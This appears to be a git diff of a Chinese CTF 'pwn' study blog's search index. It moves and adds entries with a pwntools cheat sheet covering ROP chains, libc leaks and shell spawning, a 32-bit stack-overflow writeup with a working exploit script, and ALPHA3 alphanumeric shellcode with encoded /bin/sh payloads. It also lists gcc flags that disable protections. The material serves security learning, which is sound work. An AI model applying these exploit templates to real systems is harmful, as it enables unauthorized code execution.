-from pwn import *# ===== 基础设置 =====context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)  # 设置架构为64位# context(arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)  # 设置架构为32位（取消注释使用）# ===== 连接方式 =====# p = remote(&#x27;host&#x27;, 1234)       # 远程连接p = process(&#x27;./binary&#x27;)         # 本地进程# p = gdb.debug(&#x27;./binary&#x27;)     # 带GDB调试# ===== 数据发送 =====p.send(b&#x27;data&#x27;)                 # 直接发送数据p.sendline(b&#x27;data\n&#x27;)           # 发送数据并添加换行p.sendafter(b&#x27;prompt: &#x27;, b&#x27;data&#x27;)  # 等待提示后发送p.sendlineafter(b&#x27;prompt: &#x27;, b&#x27;data&#x27;)  # 等待提示后发送并换行# ===== 数据接收 =====data = p.recv()                 # 接收所有数据data = p.recv(1024)             # 接收指定字节数data = p.recvline()             # 接收一行数据data = p.recvuntil(b&#x27;delim&#x27;)    # 接收直到遇到分隔符data = p.recvregex(b&#x27;pattern&#x27;)  # 接收直到匹配正则表达式# ===== 内存操作 =====# 64位addr = 0x123456789ABCDEF0payload = b&#x27;A&#x27;*40 + p64(addr)   # 64位地址填充value = u64(b&#x27;\xef\xcd\xab\x89\x67\x45\x23\x01&#x27;)  # 字节转64位整数# 32位（取消注释使用）# addr = 0x12345678# payload = b&#x27;A&#x27;*40 + p32(addr)  # 32位地址填充# value = u32(b&#x27;\x78\x56\x34\x12&#x27;)  # 字节转32位整数# ===== 高级功能 =====# 格式化字符串漏洞利用payload = fmtstr_payload(6, &#123;elf.got.puts: elf.plt.system&#125;)# ROP链构建elf = ELF(&#x27;./binary&#x27;)rop = ROP(elf)rop.call(elf.plt.puts, [elf.got.puts])  # 泄露puts地址rop.call(elf.symbols.main)              # 返回mainp.sendline(rop.chain())# Libc地址计算libc = ELF(&#x27;./libc.so.6&#x27;)puts_leak = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))libc.address = puts_leak - libc.symbols.puts# 执行系统命令rop = ROP(libc)rop.system(next(libc.search(b&#x27;/bin/sh&#x27;)))p.sendline(rop.chain())# ===== 其他功能 =====shellcode = asm(shellcraft.sh())  # 生成shellcodep.sendline(shellcode)p.interactive()                   # 进入交互式shellp.close()                         # 关闭连接
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN的工具笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -2738,6 +2680,106 @@ git clone https://github.com/veritas501/ae64.git --depth 1cd ae64sudo python3 se
       </tags>
   </entry>
   <entry>
+    <title>overflow_ez_32</title>
+    <url>//docx/overflow_ez_32/</url>
+    <content><![CDATA[首先checksec：
+
+保护全关，一般保护全关的题目要么特别简单要么特别难。很显然（因为这是我自己做的题），这个是前者。（当然不是所有带有ez的题目都很ez）（但是这个是真ez）
+直接拖到ida一探究竟。
+
+有一个main函数和一个back_door，还有一个overflow和init函数，backdoor里面是一个超级大后门：
+
+main函数里面是init和overflow，一个是初始化，还有一个是一个最简单的栈溢出：
+
+如图可见，这里有一个不安全的gets函数，然后有一个s变量。
+
+点进去之后我们就能发现，从-0x18到+0x04都是本栈帧的模样，然后要输入0x18个字节覆盖char字符串s和一个var_4，输入4个字节覆盖saved register，最后输入4字节的地址来覆盖return地址。
+所需要的地址就是我们的backdoor函数地址…
+
+backdoor的位置在0x080491F0这个位置上，当然我们也可以填入0x08049211这个地址，这样可以跳过上面那个puts函数的调用。不过这里没必要，我们就以backdoor的地址为需要进入的地址：
+exp：
+from pwn import *#32context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)file_addr = &#x27;./overflow_ez_32&#x27;p = process(file_addr)elf = ELF(file_addr)backdoor_addr = 0x080491F0payload = b&#x27;a&#x27;*0x18payload += b&#x27;a&#x27;*0x04payload += p32(backdoor_addr)print(payload)p.sendafter(b&#x27;door?\n&#x27;,payload)p.interactive()
+
+非常简单。
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN的writeup</tag>
+        <tag>栈溢出</tag>
+        <tag>nxctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwntools</title>
+    <url>//docx/pwntools/</url>
+    <content><![CDATA[下载python3版本这个就去看我写的pwn基础配置吧，一般而言不做老题目的话python3适配的pwntools完全够用了。不过我为了测试和学习一些老东西留下的宝贵信息，还是会用到适配python2的pwntools的。
+pwn基础配置
+python2版本pwntools 从 4.0 版本开始完全移除了 Python 2 支持，依赖现代 Python 特性（如 asyncio）。
+现在想用pwntools的python2版本只能用pwntools 3.14.1
+检查python2和pip2python2 --version  # 应输出 Python 2.7.18pip2 --version     # 应输出 pip 20.3.4 或类似版本
+
+一般而言，可能没有python2.可以去看我写的另外一个工具笔记：
+python2环境
+如果上面ok了
+pip2 install --user pyelftools==0.27pip2 install --user --upgrade &#x27;pwntools&lt;3.15&#x27;
+
+使用pwntools的使用非常简单，记住一些简单的函数就可以用起来了：
+这边写一个简单的脚本，主要是看函数的：
+from pwn import *# ===== 基础设置 =====context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)  # 设置架构为64位# context(arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)  # 设置架构为32位（取消注释使用）# ===== 连接方式 =====# p = remote(&#x27;host&#x27;, 1234)       # 远程连接p = process(&#x27;./binary&#x27;)         # 本地进程# p = gdb.debug(&#x27;./binary&#x27;)     # 带GDB调试# ===== 数据发送 =====p.send(b&#x27;data&#x27;)                 # 直接发送数据p.sendline(b&#x27;data\n&#x27;)           # 发送数据并添加换行p.sendafter(b&#x27;prompt: &#x27;, b&#x27;data&#x27;)  # 等待提示后发送p.sendlineafter(b&#x27;prompt: &#x27;, b&#x27;data&#x27;)  # 等待提示后发送并换行# ===== 数据接收 =====data = p.recv()                 # 接收所有数据data = p.recv(1024)             # 接收指定字节数data = p.recvline()             # 接收一行数据data = p.recvuntil(b&#x27;delim&#x27;)    # 接收直到遇到分隔符data = p.recvregex(b&#x27;pattern&#x27;)  # 接收直到匹配正则表达式# ===== 内存操作 =====# 64位addr = 0x123456789ABCDEF0payload = b&#x27;A&#x27;*40 + p64(addr)   # 64位地址填充value = u64(b&#x27;\xef\xcd\xab\x89\x67\x45\x23\x01&#x27;)  # 字节转64位整数# 32位（取消注释使用）# addr = 0x12345678# payload = b&#x27;A&#x27;*40 + p32(addr)  # 32位地址填充# value = u32(b&#x27;\x78\x56\x34\x12&#x27;)  # 字节转32位整数# ===== 高级功能 =====# 格式化字符串漏洞利用payload = fmtstr_payload(6, &#123;elf.got.puts: elf.plt.system&#125;)# ROP链构建elf = ELF(&#x27;./binary&#x27;)rop = ROP(elf)rop.call(elf.plt.puts, [elf.got.puts])  # 泄露puts地址rop.call(elf.symbols.main)              # 返回mainp.sendline(rop.chain())# Libc地址计算libc = ELF(&#x27;./libc.so.6&#x27;)puts_leak = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))libc.address = puts_leak - libc.symbols.puts# 执行系统命令rop = ROP(libc)rop.system(next(libc.search(b&#x27;/bin/sh&#x27;)))p.sendline(rop.chain())# ===== 其他功能 =====shellcode = asm(shellcraft.sh())  # 生成shellcodep.sendline(shellcode)p.interactive()                   # 进入交互式shellp.close()                         # 关闭连接
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN的工具笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellcode - alpha3.py</title>
+    <url>//docx/shellcode%20-%20alpha3.py/</url>
+    <content><![CDATA[下载ALPHA3ALPHA3实际上只是配windows，不过有国人制作了适配linux版本的。因为我的环境大多数都是在linux上，所以我直接下载国人修改制作的适配linux版本的ALPHA3：（我也只写了linux教程）
+git clone https://github.com/TaQini/alpha3.git
+
+我把这个py脚本git到了我的~&#x2F;Software文件夹下。
+
+直接运行会报错。我是真不理解这是什么错误。上网找了一些教程，最终发现感觉这个文件只支持python2运行。
+那么我就要在我的ubuntu里面安装一个python2环境，还要和python3环境兼容
+python2环境
+这个时候，我们可以用python2来运行程序了。
+
+使用用起来太麻烦了，每次都要进入这个傻逼目录里面他妈的调用这个傻逼脚本的话，太他妈的麻烦了。我决定创造一个链接，让我可以无时无刻用。
+为此我要创建一个叫做.links的隐藏文件夹在我的用户目录下，然后往里面塞链接。
+mkdir ~/.linkssudo ln -s ~/Softwares/alpha3/ALPHA3.py ~/.link/ALPHA3.py
+
+在做一个scmker.py文件，这个放在我的vscode里面，再弄一个ln出去玩：
+sudo ln -s /home/kanyo/pwn_test/pwncodes/python/scmker/scmker.py ~/.link/scmker.py
+
+测试一下：
+#python ~/.link/scmker.py &gt; ~/.link/shellcode#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;from pwn import *context.arch=&#x27;amd64&#x27;#context/arch=&#x27;x86_64&#x27;sc = shellcraft.sh()print(asm(sc))
+
+
+非常完美。其实这个代码还需要配合控制台用有点傻逼。不过我现在没有修改他的想法。等我哪天做题崩溃了再来补充吧~、
+后注：似乎python3版本的pwntool威力有点强大，导致有一个问题：为了避免很多不必要的bug，python3的shellcraft又臭又长。
+Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01
+
+上面使用python3生成的shellcode，下面是python2的老版本pwntools生成的shellcode：
+Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
+
+快他妈的两倍了。所以代码最好改成：
+#全部改用python2#python2 ~/.link/scmker.py &gt; ~/.link/shellcode#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;from pwn import *context.arch=&#x27;amd64&#x27;#context/arch=&#x27;x86_64&#x27;sc = shellcraft.sh()print(asm(sc))
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN的工具笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>shellcode1_dahuan02</title>
     <url>//docx/shellcode1_dahuan02/</url>
     <content><![CDATA[
@@ -2806,106 +2848,6 @@ from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;,
         <tag>shellcode</tag>
         <tag>PWN的writeup</tag>
         <tag>大欢老师の屎题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shellcode - alpha3.py</title>
-    <url>//docx/shellcode%20-%20alpha3.py/</url>
-    <content><![CDATA[下载ALPHA3ALPHA3实际上只是配windows，不过有国人制作了适配linux版本的。因为我的环境大多数都是在linux上，所以我直接下载国人修改制作的适配linux版本的ALPHA3：（我也只写了linux教程）
-git clone https://github.com/TaQini/alpha3.git
-
-我把这个py脚本git到了我的~&#x2F;Software文件夹下。
-
-直接运行会报错。我是真不理解这是什么错误。上网找了一些教程，最终发现感觉这个文件只支持python2运行。
-那么我就要在我的ubuntu里面安装一个python2环境，还要和python3环境兼容
-python2环境
-这个时候，我们可以用python2来运行程序了。
-
-使用用起来太麻烦了，每次都要进入这个傻逼目录里面他妈的调用这个傻逼脚本的话，太他妈的麻烦了。我决定创造一个链接，让我可以无时无刻用。
-为此我要创建一个叫做.links的隐藏文件夹在我的用户目录下，然后往里面塞链接。
-mkdir ~/.linkssudo ln -s ~/Softwares/alpha3/ALPHA3.py ~/.link/ALPHA3.py
-
-在做一个scmker.py文件，这个放在我的vscode里面，再弄一个ln出去玩：
-sudo ln -s /home/kanyo/pwn_test/pwncodes/python/scmker/scmker.py ~/.link/scmker.py
-
-测试一下：
-#python ~/.link/scmker.py &gt; ~/.link/shellcode#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;from pwn import *context.arch=&#x27;amd64&#x27;#context/arch=&#x27;x86_64&#x27;sc = shellcraft.sh()print(asm(sc))
-
-
-非常完美。其实这个代码还需要配合控制台用有点傻逼。不过我现在没有修改他的想法。等我哪天做题崩溃了再来补充吧~、
-后注：似乎python3版本的pwntool威力有点强大，导致有一个问题：为了避免很多不必要的bug，python3的shellcraft又臭又长。
-Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01
-
-上面使用python3生成的shellcode，下面是python2的老版本pwntools生成的shellcode：
-Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
-
-快他妈的两倍了。所以代码最好改成：
-#全部改用python2#python2 ~/.link/scmker.py &gt; ~/.link/shellcode#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;from pwn import *context.arch=&#x27;amd64&#x27;#context/arch=&#x27;x86_64&#x27;sc = shellcraft.sh()print(asm(sc))
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN的工具笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>其他-gcc指令</title>
-    <url>//docx/%E5%85%B6%E4%BB%96-gcc%E6%8C%87%E4%BB%A4/</url>
-    <content><![CDATA[基础指令最基本的GCC编译命令格式：
-gcc [选项] [源文件] [选项] [目标文件]
-
-
--o：将C源文件编译成可执行文件
--g：生成时候带有debug信息
-
-常用命令#32 位保护全关的编译命令gcc -m32 -fno-stack-protector -z execstack -no-pie -fno-pic -O0 -U_FORTIFY_SOURCE -o program32 program.c#64 位保护全关的编译命令gcc -m64 -fno-stack-protector -z execstack -no-pie -fno-pic -O0 -U_FORTIFY_SOURCE -o program64 program.c#32 位保护全关且关闭编译器警告命令gcc -m32 -fno-stack-protector -z execstack -no-pie -fno-pic -Wno-implicit-function-declaration -o program32 program.c#32 位保护全关且关闭编译器警告命令gcc -m64 -fno-stack-protector -z execstack -no-pie -fno-pic -Wno-implicit-function-declaration -o program64 program.c
-
-平台相关
--m32：生成 32 位代码，需要系统安装 32 位开发库。
--m64：生成 64 位代码（默认选项，64 位系统下）。
-
-保护机制相关
-NX 保护（数据执行保护）
--z execstack：关闭 NX 保护，使栈可执行（不安全）。
--z noexecstack：开启 NX 保护（默认），使栈不可执行。
-
-
-Canary（栈保护）
--fno-stack-protector：关闭栈保护。
--fstack-protector：启用基础栈保护。
--fstack-protector-all：启用全面栈保护（所有函数）。
-
-
-RELRO（地址重定向保护）
--Wl,-z,relro：部分 RELRO，使 GOT 表只读。
--Wl,-z,now：完全 RELRO，程序加载时解析所有符号。
-
-
-PIE（位置无关可执行文件）
--fPIE -pie：生成 PIE 可执行文件，启用 ASLR 保护。
--no-pie
-
-
-Fortify Source
--D_FORTIFY_SOURCE&#x3D;2：增强缓冲区溢出检测。
-
-
-
-优化相关
--O0：不进行优化（默认级别），调试友好。
--O1：基础优化，在编译时间和代码性能间平衡。
--O2：中级优化，比 - O1 更激进，推荐生产环境使用。
--O3：高级优化，启用更多优化选项，可能增加编译时间。
--Os：针对代码尺寸优化，适合嵌入式系统。
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN的工具笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -7168,6 +7110,64 @@ arch_prctl
       <tags>
         <tag>PWN攻略-所需表格</tag>
         <tag>计算机原理相关表格</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>其他-gcc指令</title>
+    <url>//docx/%E5%85%B6%E4%BB%96-gcc%E6%8C%87%E4%BB%A4/</url>
+    <content><![CDATA[基础指令最基本的GCC编译命令格式：
+gcc [选项] [源文件] [选项] [目标文件]
+
+
+-o：将C源文件编译成可执行文件
+-g：生成时候带有debug信息
+
+常用命令#32 位保护全关的编译命令gcc -m32 -fno-stack-protector -z execstack -no-pie -fno-pic -O0 -U_FORTIFY_SOURCE -o program32 program.c#64 位保护全关的编译命令gcc -m64 -fno-stack-protector -z execstack -no-pie -fno-pic -O0 -U_FORTIFY_SOURCE -o program64 program.c#32 位保护全关且关闭编译器警告命令gcc -m32 -fno-stack-protector -z execstack -no-pie -fno-pic -Wno-implicit-function-declaration -o program32 program.c#32 位保护全关且关闭编译器警告命令gcc -m64 -fno-stack-protector -z execstack -no-pie -fno-pic -Wno-implicit-function-declaration -o program64 program.c
+
+平台相关
+-m32：生成 32 位代码，需要系统安装 32 位开发库。
+-m64：生成 64 位代码（默认选项，64 位系统下）。
+
+保护机制相关
+NX 保护（数据执行保护）
+-z execstack：关闭 NX 保护，使栈可执行（不安全）。
+-z noexecstack：开启 NX 保护（默认），使栈不可执行。
+
+
+Canary（栈保护）
+-fno-stack-protector：关闭栈保护。
+-fstack-protector：启用基础栈保护。
+-fstack-protector-all：启用全面栈保护（所有函数）。
+
+
+RELRO（地址重定向保护）
+-Wl,-z,relro：部分 RELRO，使 GOT 表只读。
+-Wl,-z,now：完全 RELRO，程序加载时解析所有符号。
+
+
+PIE（位置无关可执行文件）
+-fPIE -pie：生成 PIE 可执行文件，启用 ASLR 保护。
+-no-pie
+
+
+Fortify Source
+-D_FORTIFY_SOURCE&#x3D;2：增强缓冲区溢出检测。
+
+
+
+优化相关
+-O0：不进行优化（默认级别），调试友好。
+-O1：基础优化，在编译时间和代码性能间平衡。
+-O2：中级优化，比 - O1 更激进，推荐生产环境使用。
+-O3：高级优化，启用更多优化选项，可能增加编译时间。
+-Os：针对代码尺寸优化，适合嵌入式系统。
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN的工具笔记</tag>
       </tags>
   </entry>
   <entry>
